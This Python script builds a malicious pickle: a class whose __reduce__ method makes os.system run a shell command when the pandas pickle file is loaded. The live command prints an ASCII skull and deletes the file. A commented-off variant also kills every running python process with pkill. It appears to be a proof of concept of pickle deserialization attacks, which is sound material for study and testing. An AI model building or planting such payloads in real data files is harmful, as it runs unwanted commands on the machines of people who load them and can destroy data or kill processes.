import pickle
import os
import pandas as pd
import time


_skull = r"""
          __ __ __
        /          \ 
       /            \ 
      |              | 
      |,  .-.  .-.  ,| 
      | )(__/  \__)( | 
      |/     /\     \| 
      (_     ^^     _) 
       \__|IIIIII|__/ 
        | \IIIIII/ | 
        \          / 
         XXXXXXXXXX
"""


class Malicious(object):
    def __reduce__(self):
        # Please don't use this at all, use the normal cmd instead, this can nuke a lot
        cmd_very_bad = f'echo "{_skull}" && rm malicious.pkl && pkill -f "python.*" $$'

        cmd = f'echo "{_skull}" && rm malicious.pkl $$'
        return (
            os.system,
            (cmd,),
        )


if __name__ == "__main__":
    data = pd.DataFrame({"malicious": [Malicious()]})
    data.to_pickle("malicious.pkl")
